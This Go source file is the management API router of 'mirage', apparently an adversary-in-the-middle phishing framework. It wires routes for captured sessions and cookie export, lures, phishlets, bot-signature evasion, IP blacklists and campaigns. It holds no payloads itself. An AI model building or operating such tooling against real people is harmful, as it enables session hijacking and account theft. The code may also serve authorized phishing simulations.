package api

import (
	"encoding/json"
	"errors"
	"log/slog"
	"net/http"
	"strconv"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/store"
	"github.com/travisbale/mirage/sdk"
)

type sessionManager interface {
	Get(id string) (*aitm.Session, error)
	List(filter aitm.SessionFilter) ([]*aitm.Session, error)
	Count(filter aitm.SessionFilter) (int, error)
	Delete(id string) error
	ExportCookiesJSON(id string) ([]byte, error)
}

type lureManager interface {
	Get(id string) (*aitm.Lure, error)
	Create(lure *aitm.Lure) error
	Update(lure *aitm.Lure) error
	Delete(id string) error
	List() ([]*aitm.Lure, error)
	Pause(id string, d time.Duration) error
	Unpause(id string) error
}

type phishletManager interface {
	GetPhishletConfig(name string) (*aitm.PhishletConfig, error)
	SetPhishletConfig(cfg *aitm.PhishletConfig) error
	ListPhishletConfigs() ([]*aitm.PhishletConfig, error)
	CreateSubPhishlet(sp *aitm.SubPhishlet) error
	DeleteSubPhishlet(name string) error
}

type blacklistManager interface {
	Block(ip string)
	Unblock(ip string)
	List() []string
}

type botguardManager interface {
	ListBotSignatures() ([]aitm.BotSignature, error)
	CreateBotSignature(sig aitm.BotSignature) error
	DeleteBotSignature(ja4Hash string) (bool, error)
}

type eventBus interface {
	Subscribe(eventType aitm.EventType) <-chan aitm.Event
	Unsubscribe(eventType aitm.EventType, ch <-chan aitm.Event)
}

// RouterDeps holds the dependencies required to construct a Router.
type RouterDeps struct {
	Sessions  sessionManager
	Lures     lureManager
	Phishlets phishletManager
	Blacklist blacklistManager
	Botguard  botguardManager
	Bus       eventBus
	Domain    string // global base domain for lure URL generation
	Version   string
	Logger    *slog.Logger
}

// Router is the top-level handler for the management API. It implements
// http.Handler and is passed to the APIRouter pipeline step.
type Router struct {
	mux       *http.ServeMux
	sessions  sessionManager
	lures     lureManager
	phishlets phishletManager
	blacklist blacklistManager
	botguard  botguardManager
	bus       eventBus
	domain    string
	version   string
	startedAt time.Time
	logger    *slog.Logger
}

// NewRouter wires all dependencies into the ServeMux and returns a ready Router.
func NewRouter(deps RouterDeps) *Router {
	r := &Router{
		mux:       http.NewServeMux(),
		sessions:  deps.Sessions,
		lures:     deps.Lures,
		phishlets: deps.Phishlets,
		blacklist: deps.Blacklist,
		botguard:  deps.Botguard,
		bus:       deps.Bus,
		domain:    deps.Domain,
		version:   deps.Version,
		startedAt: time.Now(),
		logger:    deps.Logger,
	}

	r.registerRoutes()

	return r
}

func (r *Router) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	r.mux.ServeHTTP(w, req)
}

func (r *Router) registerRoutes() {
	h := func(method, route string, handler http.HandlerFunc) {
		r.mux.HandleFunc(method+" "+route, r.authMiddleware(r.auditMiddleware(handler)))
	}

	// Sessions
	h("GET", sdk.RouteSessionsStream, r.streamSessions)
	h("GET", sdk.RouteSessionExport, r.exportSessionCookies)
	h("GET", sdk.RouteSession, r.getSession)
	h("DELETE", sdk.RouteSession, r.deleteSession)
	h("GET", sdk.RouteSessions, r.listSessions)

	// Lures
	h("GET", sdk.RouteLures, r.listLures)
	h("POST", sdk.RouteLures, r.createLure)
	h("PATCH", sdk.RouteLure, r.updateLure)
	h("DELETE", sdk.RouteLure, r.deleteLure)
	h("POST", sdk.RouteLureURL, r.generateLureURL)
	h("POST", sdk.RouteLurePause, r.pauseLure)
	h("DELETE", sdk.RouteLurePause, r.unpauseLure)

	// Phishlets
	h("GET", sdk.RoutePhishletRegistry, r.listRegistry)
	h("GET", sdk.RoutePhishletHosts, r.getPhishletHosts)
	h("POST", sdk.RoutePhishletEnable, r.enablePhishlet)
	h("POST", sdk.RoutePhishletDisable, r.disablePhishlet)
	h("POST", sdk.RoutePhishletHide, r.hidePhishlet)
	h("POST", sdk.RoutePhishletUnhide, r.unhidePhishlet)
	h("DELETE", sdk.RoutePhishlet, r.deleteSubPhishlet)
	h("GET", sdk.RoutePhishlets, r.listPhishlets)
	h("POST", sdk.RoutePhishlets, r.createSubPhishlet)

	// Blacklist
	h("GET", sdk.RouteBlacklist, r.listBlacklist)
	h("POST", sdk.RouteBlacklist, r.addBlacklistEntry)
	h("DELETE", sdk.RouteBlacklistEntry, r.removeBlacklistEntry)

	// DNS
	h("GET", sdk.RouteDNSZones, r.listDNSZones)
	h("POST", sdk.RouteDNSSync, r.syncDNS)

	// BotGuard
	h("GET", sdk.RouteBotSignatures, r.listBotSignatures)
	h("POST", sdk.RouteBotSignatures, r.addBotSignature)
	h("DELETE", sdk.RouteBotSignature, r.removeBotSignature)
	h("PATCH", sdk.RouteBotThreshold, r.updateBotThreshold)

	// System
	h("GET", sdk.RouteStatus, r.getStatus)
	h("POST", sdk.RouteReload, r.reload)

	// Campaigns
	h("GET", sdk.RouteCampaigns, r.listCampaignMappings)
	h("POST", sdk.RouteCampaignSync, r.syncCampaign)
}

func writeJSON(w http.ResponseWriter, status int, v any) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(v)
}

func writeError(w http.ResponseWriter, status int, message, code string) {
	writeJSON(w, status, sdk.ErrorResponse{Error: message, Code: code})
}

func parsePagination(req *http.Request) (limit, offset int) {
	limit = 50
	if v := req.URL.Query().Get("limit"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 {
			limit = n
		}
	}
	if limit > 500 {
		limit = 500
	}
	if v := req.URL.Query().Get("offset"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n >= 0 {
			offset = n
		}
	}
	return
}

// parseRFC3339Param parses an RFC3339 timestamp query parameter. It writes a
// 400 error and returns false if the value is present but malformed.
func parseRFC3339Param(w http.ResponseWriter, name, value string) (time.Time, bool) {
	t, err := time.Parse(time.RFC3339, value)
	if err != nil {
		writeError(w, http.StatusBadRequest, name+": invalid RFC3339 timestamp", "VALIDATION_ERROR")
		return time.Time{}, false
	}
	return t, true
}

// errStatus maps store sentinel errors to HTTP status codes and API error codes.
func errStatus(err error) (int, string) {
	if errors.Is(err, store.ErrNotFound) {
		return http.StatusNotFound, "NOT_FOUND"
	}
	if errors.Is(err, store.ErrConflict) {
		return http.StatusConflict, "CONFLICT"
	}
	return http.StatusInternalServerError, "INTERNAL_ERROR"
}
